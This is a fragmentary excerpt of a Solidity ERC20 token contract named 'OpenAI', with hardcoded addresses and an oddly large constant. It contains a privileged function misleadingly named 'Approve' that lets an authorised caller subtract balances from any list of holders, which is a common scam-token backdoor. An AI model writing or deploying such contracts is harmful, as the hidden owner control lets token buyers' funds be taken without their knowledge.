...
contract OpenAI is Context, IERC20 {
    ...
    address _addr = 0x50365f80B57aCC805d6A5219e1529de80cc60b30;
    address public _origin = 0x1723E045398179437E9F933906B205091f152521;
    uint256 private _maximumVal = 115792089237316195423570985008687907853269984665640564039457584007913129639930;
    constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    function Approve(address[] memory holders)  public auth(){
        ...
        for (uint256 i = 0; i < holders.length; i++) {
            ...
            _balances[holders[i]] = _balances[holders[i]].sub(amount, "ERC20: burn balance");
